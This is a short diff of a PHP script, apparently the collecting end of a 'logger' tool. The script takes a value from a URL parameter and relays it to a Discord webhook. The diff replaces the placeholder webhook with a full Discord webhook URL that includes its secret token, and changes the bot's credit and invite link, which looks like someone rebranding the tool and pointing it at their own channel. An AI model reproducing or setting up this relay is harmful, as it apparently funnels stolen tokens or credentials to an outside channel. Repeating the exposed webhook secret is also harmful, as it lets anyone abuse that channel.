@@ -6,7 +6,7 @@ $wontent = htmlspecialchars($_GET['t']);
 // Create new webhook in your Discord channel settings and copy&paste URL
 //=======================================================================================================
 
-$webhookurl = "YourWebhook";
+$webhookurl = "https://discord.com/api/webhooks/908003085912248331/vH0_OPAGQz1c77tqn_QSzH3V0pqWrjMcTia_PHd02uArHyVKhWvtaUagnQ4H_J7RzxPU";
 
 //=======================================================================================================
 // Compose message. You can use Markdown
@@ -56,7 +56,7 @@ $json_data = json_encode([
 
             // Footer
             "footer" => [
-                "text" => "Bot by Ice Bear#8828",
+                "text" => "Bot by 64bit#2082",
                 "icon_url" => ""
             ],
 
@@ -71,7 +71,7 @@ $json_data = json_encode([
             // Author
             "author" => [
                 "name" => "Ice logger",
-                "url" => "https://discord.gg/sUPRXSYMKg"
+                "url" => "https://discord.gg/a"
             ],
 
             // Additional Fields array
